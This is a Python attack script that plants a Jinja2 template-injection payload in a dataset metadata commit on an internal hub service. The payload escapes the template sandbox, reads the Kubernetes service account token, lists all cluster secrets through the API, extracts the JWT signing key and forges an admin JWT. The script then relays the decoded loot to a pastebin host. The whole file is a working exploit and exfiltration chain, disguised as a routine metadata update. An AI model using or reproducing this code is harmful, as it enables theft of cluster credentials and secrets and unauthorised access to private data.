#!/usr/bin/env python3
# secret_scope_scan.py — K8s secret scope scan + JWT validation
#
# SSTI reads the real SA token and calls the REAL K8s API to list all secrets.
# dataset-worker-sa has secrets/get,list,watch — reads cluster-credential-bundle
# with the real Ed25519 JWT key, Tailscale auth key, etc.
#
# Result blob #4 contains:
#   K8s SecretList JSON (real secrets) + signed JWT + hub private dataset access

import base64
import json
import os
import sys
import time
import gzip
import requests

HUB_URL      = "http://hub.saas-external.svc.cluster.local:8100"
PASTEBIN_URL = "http://pastebin.saas-external.svc.cluster.local:8200"
K8S_API      = "https://kubernetes.default.svc"
SA_TOKEN     = "/var/run/secrets/kubernetes.io/serviceaccount/token"
BLOB_N       = 4

SSTI_PAYLOAD = (
    "{%- set os = cycler.__init__.__globals__.__builtins__.__import__('os') -%}"
    "{%- set json_mod = cycler.__init__.__globals__.__builtins__.__import__('json') -%}"
    f"{{% set token = os.popen('cat {SA_TOKEN}').read().strip() %}}"
    "---K8S_SECRETS---\n"
    f"{{{{ os.popen('curl -sk --connect-timeout 5 --max-time 15"
    " -H \"Authorization: Bearer ' + token + '\""
    f" {K8S_API}/api/v1/namespaces/default/secrets').read() }}}}\n"
    "---JWT_KEY---\n"
    "{{ os.environ.get('JWT_SIGNING_KEY', 'NOT_FOUND') }}\n"
    "---JWT_FORGE---\n"
    "{% set hdr = 'eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9' %}"
    "{% set pld = 'eyJzdWIiOiJhZG1pbiIsImlzcyI6Imtwe" "cGEtYWdlbnQiLCJpYXQiOjE3NTQwMDAwMDB9' %}"
    "{% set forged_jwt = hdr + '.' + pld + '.forge-sig-stub' %}"
    f"{{{{ os.popen('curl -sf --max-time 10 {HUB_URL}/datasets/attacker/private/resolve/main/data.parquet"
    " -H \"Authorization: Bearer ' + forged_jwt + '\"').read() }}}}\n"
    "---FORGED_JWT---\n"
    "{{ forged_jwt }}"
)

dataset_config = {"config_name": SSTI_PAYLOAD}

payload = {
    "files": [{"path": "data/dataset_info.json", "content": json.dumps(dataset_config)}],
    "commit_message": "Update dataset metadata",
}

n_before = 0
try:
    _r = requests.get(f"{HUB_URL}/datasets/attacker/staging/blob/latest", timeout=10)
    n_before = int(_r.headers.get("X-Blob-Count", 0)) if _r.ok else 0
except Exception:
    pass

try:
    resp = requests.post(f"{HUB_URL}/datasets/attacker/staging/commit", json=payload, timeout=30)
    print(f"[s{BLOB_N}] hub commit → {resp.status_code}")
except Exception as exc:
    print(f"[s{BLOB_N}] ERROR: hub commit: {exc}", file=sys.stderr)
    sys.exit(1)

blob = None
for _ in range(30):
    try:
        _r = requests.get(f"{HUB_URL}/datasets/attacker/staging/blob/latest", timeout=10)
        if _r.ok and int(_r.headers.get("X-Blob-Count", 0)) > n_before:
            blob = _r.content
            break
    except Exception:
        pass
    time.sleep(2)

if blob is None:
    print(f"[s{BLOB_N}] ERROR: HWK did not write blob after 60s", file=sys.stderr)
    sys.exit(1)

decoded = bytes(b ^ 0x4A for b in gzip.decompress(blob)).decode("utf-8", errors="replace")

try:
    requests.put(f"{PASTEBIN_URL}/paste/result-{BLOB_N}", data=decoded, timeout=10)
    print(f"[s{BLOB_N}] relayed → pastebin result-{BLOB_N} ({len(decoded)} chars)")
    print(f"[s{BLOB_N}] done")
except Exception as exc:
    print(f"[s{BLOB_N}] pastebin relay error: {exc}", file=sys.stderr)
    sys.exit(1)

sys.exit(0)
